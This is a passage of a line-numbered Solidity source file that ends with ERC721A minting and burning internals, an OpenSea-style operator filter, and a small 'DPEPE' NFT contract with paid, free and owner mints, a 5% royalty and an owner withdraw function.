1033      */
1034     function _checkContractOnERC721Received(
1035         address from,
1036         address to,
1037         uint256 tokenId,
1038         bytes memory _data
1039     ) private returns (bool) {
1040         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1041             bytes4 retval
1042         ) {
1043             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1044         } catch (bytes memory reason) {
1045             if (reason.length == 0) {
1046                 revert TransferToNonERC721ReceiverImplementer();
1047             } else {
1048                 assembly {
1049                     revert(add(32, reason), mload(reason))
1050                 }
1051             }
1052         }
1053     }
1054 
1055     // =============================================================
1056     //                        MINT OPERATIONS
1057     // =============================================================
1058 
1059     /**
1060      * @dev Mints `quantity` tokens and transfers them to `to`.
1061      *
1062      * Requirements:
1063      *
1064      * - `to` cannot be the zero address.
1065      * - `quantity` must be greater than 0.
1066      *
1067      * Emits a {Transfer} event for each mint.
1068      */
1069     function _mint(address to, uint256 quantity) internal virtual {
1070         uint256 startTokenId = _currentIndex;
1071         if (quantity == 0) revert MintZeroQuantity();
1072 
1073         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1074 
1075         // Overflows are incredibly unrealistic.
1076         // `balance` and `numberMinted` have a maximum limit of 2**64.
1077         // `tokenId` has a maximum limit of 2**256.
1078         unchecked {
1079             // Updates:
1080             // - `balance += quantity`.
1081             // - `numberMinted += quantity`.
1082             //
1083             // We can directly add to the `balance` and `numberMinted`.
1084             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1085 
1086             // Updates:
1087             // - `address` to the owner.
1088             // - `startTimestamp` to the timestamp of minting.
1089             // - `burned` to `false`.
1090             // - `nextInitialized` to `quantity == 1`.
1091             _packedOwnerships[startTokenId] = _packOwnershipData(
1092                 to,
1093                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1094             );
1095 
1096             uint256 toMasked;
1097             uint256 end = startTokenId + quantity;
1098 
1099             // Use assembly to loop and emit the `Transfer` event for gas savings.
1100             // The duplicated `log4` removes an extra check and reduces stack juggling.
1101             // The assembly, together with the surrounding Solidity code, have been
1102             // delicately arranged to nudge the compiler into producing optimized opcodes.
1103             assembly {
1104                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1105                 toMasked := and(to, _BITMASK_ADDRESS)
1106                 // Emit the `Transfer` event.
1107                 log4(
1108                     0, // Start of data (0, since no data).
1109                     0, // End of data (0, since no data).
1110                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1111                     0, // `address(0)`.
1112                     toMasked, // `to`.
1113                     startTokenId // `tokenId`.
1114                 )
1115 
1116                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1117                 // that overflows uint256 will make the loop run out of gas.
1118                 // The compiler will optimize the `iszero` away for performance.
1119                 for {
1120                     let tokenId := add(startTokenId, 1)
1121                 } iszero(eq(tokenId, end)) {
1122                     tokenId := add(tokenId, 1)
1123                 } {
1124                     // Emit the `Transfer` event. Similar to above.
1125                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1126                 }
1127             }
1128             if (toMasked == 0) revert MintToZeroAddress();
1129 
1130             _currentIndex = end;
1131         }
1132         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1133     }
1134 
1135     /**
1136      * @dev Mints `quantity` tokens and transfers them to `to`.
1137      *
1138      * This function is intended for efficient minting only during contract creation.
1139      *
1140      * It emits only one {ConsecutiveTransfer} as defined in
1141      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1142      * instead of a sequence of {Transfer} event(s).
1143      *
1144      * Calling this function outside of contract creation WILL make your contract
1145      * non-compliant with the ERC721 standard.
1146      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1147      * {ConsecutiveTransfer} event is only permissible during contract creation.
1148      *
1149      * Requirements:
1150      *
1151      * - `to` cannot be the zero address.
1152      * - `quantity` must be greater than 0.
1153      *
1154      * Emits a {ConsecutiveTransfer} event.
1155      */
1156     function _mintERC2309(address to, uint256 quantity) internal virtual {
1157         uint256 startTokenId = _currentIndex;
1158         if (to == address(0)) revert MintToZeroAddress();
1159         if (quantity == 0) revert MintZeroQuantity();
1160         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1161 
1162         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1163 
1164         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1165         unchecked {
1166             // Updates:
1167             // - `balance += quantity`.
1168             // - `numberMinted += quantity`.
1169             //
1170             // We can directly add to the `balance` and `numberMinted`.
1171             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1172 
1173             // Updates:
1174             // - `address` to the owner.
1175             // - `startTimestamp` to the timestamp of minting.
1176             // - `burned` to `false`.
1177             // - `nextInitialized` to `quantity == 1`.
1178             _packedOwnerships[startTokenId] = _packOwnershipData(
1179                 to,
1180                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1181             );
1182 
1183             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1184 
1185             _currentIndex = startTokenId + quantity;
1186         }
1187         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1188     }
1189 
1190     /**
1191      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1192      *
1193      * Requirements:
1194      *
1195      * - If `to` refers to a smart contract, it must implement
1196      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1197      * - `quantity` must be greater than 0.
1198      *
1199      * See {_mint}.
1200      *
1201      * Emits a {Transfer} event for each mint.
1202      */
1203     function _safeMint(
1204         address to,
1205         uint256 quantity,
1206         bytes memory _data
1207     ) internal virtual {
1208         _mint(to, quantity);
1209 
1210         unchecked {
1211             if (to.code.length != 0) {
1212                 uint256 end = _currentIndex;
1213                 uint256 index = end - quantity;
1214                 do {
1215                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1216                         revert TransferToNonERC721ReceiverImplementer();
1217                     }
1218                 } while (index < end);
1219                 // Reentrancy protection.
1220                 if (_currentIndex != end) revert();
1221             }
1222         }
1223     }
1224 
1225     /**
1226      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1227      */
1228     function _safeMint(address to, uint256 quantity) internal virtual {
1229         _safeMint(to, quantity, '');
1230     }
1231 
1232     // =============================================================
1233     //                        BURN OPERATIONS
1234     // =============================================================
1235 
1236     /**
1237      * @dev Equivalent to `_burn(tokenId, false)`.
1238      */
1239     function _burn(uint256 tokenId) internal virtual {
1240         _burn(tokenId, false);
1241     }
1242 
1243     /**
1244      * @dev Destroys `tokenId`.
1245      * The approval is cleared when the token is burned.
1246      *
1247      * Requirements:
1248      *
1249      * - `tokenId` must exist.
1250      *
1251      * Emits a {Transfer} event.
1252      */
1253     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1254         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1255 
1256         address from = address(uint160(prevOwnershipPacked));
1257 
1258         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1259 
1260         if (approvalCheck) {
1261             // The nested ifs save around 20+ gas over a compound boolean condition.
1262             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1263                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1264         }
1265 
1266         _beforeTokenTransfers(from, address(0), tokenId, 1);
1267 
1268         // Clear approvals from the previous owner.
1269         assembly {
1270             if approvedAddress {
1271                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1272                 sstore(approvedAddressSlot, 0)
1273             }
1274         }
1275 
1276         // Underflow of the sender's balance is impossible because we check for
1277         // ownership above and the recipient's balance can't realistically overflow.
1278         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1279         unchecked {
1280             // Updates:
1281             // - `balance -= 1`.
1282             // - `numberBurned += 1`.
1283             //
1284             // We can directly decrement the balance, and increment the number burned.
1285             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1286             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1287 
1288             // Updates:
1289             // - `address` to the last owner.
1290             // - `startTimestamp` to the timestamp of burning.
1291             // - `burned` to `true`.
1292             // - `nextInitialized` to `true`.
1293             _packedOwnerships[tokenId] = _packOwnershipData(
1294                 from,
1295                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1296             );
1297 
1298             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1299             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1300                 uint256 nextTokenId = tokenId + 1;
1301                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1302                 if (_packedOwnerships[nextTokenId] == 0) {
1303                     // If the next slot is within bounds.
1304                     if (nextTokenId != _currentIndex) {
1305                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1306                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1307                     }
1308                 }
1309             }
1310         }
1311 
1312         emit Transfer(from, address(0), tokenId);
1313         _afterTokenTransfers(from, address(0), tokenId, 1);
1314 
1315         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1316         unchecked {
1317             _burnCounter++;
1318         }
1319     }
1320 
1321     // =============================================================
1322     //                     EXTRA DATA OPERATIONS
1323     // =============================================================
1324 
1325     /**
1326      * @dev Directly sets the extra data for the ownership data `index`.
1327      */
1328     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1329         uint256 packed = _packedOwnerships[index];
1330         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1331         uint256 extraDataCasted;
1332         // Cast `extraData` with assembly to avoid redundant masking.
1333         assembly {
1334             extraDataCasted := extraData
1335         }
1336         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1337         _packedOwnerships[index] = packed;
1338     }
1339 
1340     /**
1341      * @dev Called during each token transfer to set the 24bit `extraData` field.
1342      * Intended to be overridden by the cosumer contract.
1343      *
1344      * `previousExtraData` - the value of `extraData` before transfer.
1345      *
1346      * Calling conditions:
1347      *
1348      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1349      * transferred to `to`.
1350      * - When `from` is zero, `tokenId` will be minted for `to`.
1351      * - When `to` is zero, `tokenId` will be burned by `from`.
1352      * - `from` and `to` are never both zero.
1353      */
1354     function _extraData(
1355         address from,
1356         address to,
1357         uint24 previousExtraData
1358     ) internal view virtual returns (uint24) {}
1359 
1360     /**
1361      * @dev Returns the next extra data for the packed ownership data.
1362      * The returned result is shifted into position.
1363      */
1364     function _nextExtraData(
1365         address from,
1366         address to,
1367         uint256 prevOwnershipPacked
1368     ) private view returns (uint256) {
1369         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1370         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1371     }
1372 
1373     // =============================================================
1374     //                       OTHER OPERATIONS
1375     // =============================================================
1376 
1377     /**
1378      * @dev Returns the message sender (defaults to `msg.sender`).
1379      *
1380      * If you are writing GSN compatible contracts, you need to override this function.
1381      */
1382     function _msgSenderERC721A() internal view virtual returns (address) {
1383         return msg.sender;
1384     }
1385 
1386     /**
1387      * @dev Converts a uint256 to its ASCII string decimal representation.
1388      */
1389     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1390         assembly {
1391             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1392             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1393             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1394             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1395             let m := add(mload(0x40), 0xa0)
1396             // Update the free memory pointer to allocate.
1397             mstore(0x40, m)
1398             // Assign the `str` to the end.
1399             str := sub(m, 0x20)
1400             // Zeroize the slot after the string.
1401             mstore(str, 0)
1402 
1403             // Cache the end of the memory to calculate the length later.
1404             let end := str
1405 
1406             // We write the string from rightmost digit to leftmost digit.
1407             // The following is essentially a do-while loop that also handles the zero case.
1408             // prettier-ignore
1409             for { let temp := value } 1 {} {
1410                 str := sub(str, 1)
1411                 // Write the character to the pointer.
1412                 // The ASCII index of the '0' character is 48.
1413                 mstore8(str, add(48, mod(temp, 10)))
1414                 // Keep dividing `temp` until zero.
1415                 temp := div(temp, 10)
1416                 // prettier-ignore
1417                 if iszero(temp) { break }
1418             }
1419 
1420             let length := sub(end, str)
1421             // Move the pointer 32 bytes leftwards to make room for the length.
1422             str := sub(str, 0x20)
1423             // Store the length.
1424             mstore(str, length)
1425         }
1426     }
1427 }
1428 
1429 
1430 interface IOperatorFilterRegistry {
1431     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1432     function register(address registrant) external;
1433     function registerAndSubscribe(address registrant, address subscription) external;
1434     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1435     function unregister(address addr) external;
1436     function updateOperator(address registrant, address operator, bool filtered) external;
1437     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1438     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1439     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1440     function subscribe(address registrant, address registrantToSubscribe) external;
1441     function unsubscribe(address registrant, bool copyExistingEntries) external;
1442     function subscriptionOf(address addr) external returns (address registrant);
1443     function subscribers(address registrant) external returns (address[] memory);
1444     function subscriberAt(address registrant, uint256 index) external returns (address);
1445     function copyEntriesOf(address registrant, address registrantToCopy) external;
1446     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1447     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1448     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1449     function filteredOperators(address addr) external returns (address[] memory);
1450     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1451     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1452     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1453     function isRegistered(address addr) external returns (bool);
1454     function codeHashOf(address addr) external returns (bytes32);
1455 }
1456 
1457 
1458 /**
1459  * @title  OperatorFilterer
1460  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1461  *         registrant's entries in the OperatorFilterRegistry.
1462  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1463  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1464  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1465  */
1466 abstract contract OperatorFilterer {
1467     error OperatorNotAllowed(address operator);
1468 
1469     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1470         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1471 
1472     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1473         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1474         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1475         // order for the modifier to filter addresses.
1476         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1477             if (subscribe) {
1478                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1479             } else {
1480                 if (subscriptionOrRegistrantToCopy != address(0)) {
1481                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1482                 } else {
1483                     OPERATOR_FILTER_REGISTRY.register(address(this));
1484                 }
1485             }
1486         }
1487     }
1488 
1489     modifier onlyAllowedOperator(address from) virtual {
1490         // Check registry code length to facilitate testing in environments without a deployed registry.
1491         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1492             // Allow spending tokens from addresses with balance
1493             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1494             // from an EOA.
1495             if (from == msg.sender) {
1496                 _;
1497                 return;
1498             }
1499             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1500                 revert OperatorNotAllowed(msg.sender);
1501             }
1502         }
1503         _;
1504     }
1505 
1506     modifier onlyAllowedOperatorApproval(address operator) virtual {
1507         // Check registry code length to facilitate testing in environments without a deployed registry.
1508         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1509             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1510                 revert OperatorNotAllowed(operator);
1511             }
1512         }
1513         _;
1514     }
1515 }
1516 
1517 /**
1518  * @title  DefaultOperatorFilterer
1519  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1520  */
1521 abstract contract TheOperatorFilterer is OperatorFilterer {
1522     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1523     address public owner;
1524 
1525     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1526 }
1527 
1528 
1529 contract DPEPE is ERC721A, TheOperatorFilterer {
1530 
1531     uint256 public maxSupply = 3333;
1532 
1533     uint256 public mintPrice = 0.001 ether;
1534 
1535     function mint(uint256 amount) payable public {
1536         require(totalSupply() + amount <= maxSupply);
1537         require(msg.value >= mintPrice * amount);
1538         _safeMint(msg.sender, amount);
1539     }
1540 
1541     function freemint() public {
1542         require(totalSupply() + 1 <= maxSupply);
1543         require(balanceOf(msg.sender) < 1);
1544         _safeMint(msg.sender, FreeNum());
1545     }
1546 
1547     function teamMint(address addr, uint256 amount) public onlyOwner {
1548         require(totalSupply() + amount <= maxSupply);
1549         _safeMint(addr, amount);
1550     }
1551     
1552     modifier onlyOwner {
1553         require(owner == msg.sender);
1554         _;
1555     }
1556 
1557     constructor() ERC721A("D P E P E", "DPEPE") {
1558         owner = msg.sender;
1559     }
1560 
1561     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1562         return string(abi.encodePacked("ipfs://bafybeifiy4zq7dcgapcpihaivnq45jnoqteewpxs2e335oliwhth3su6i4/", _toString(tokenId), ".json"));
1563     }
1564 
1565     function FreeNum() internal returns (uint256){
1566         return (maxSupply - totalSupply()) / 1000;
1567     }
1568 
1569     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1570         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1571         return (owner, royaltyAmount);
1572     }
1573 
1574     function withdraw() external onlyOwner {
1575         payable(msg.sender).transfer(address(this).balance);
1576     }
1577 
1578     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1579         super.setApprovalForAll(operator, approved);
1580     }
1581 
1582     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1583         super.approve(operator, tokenId);
1584     }
1585 
1586     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1587         super.transferFrom(from, to, tokenId);
1588     }
1589 
1590     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1591         super.safeTransferFrom(from, to, tokenId);
1592     }
1593 
1594     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1595         public
1596         payable
1597         override
1598         onlyAllowedOperator(from)
1599     {
1600         super.safeTransferFrom(from, to, tokenId, data);
1601     }
1602 }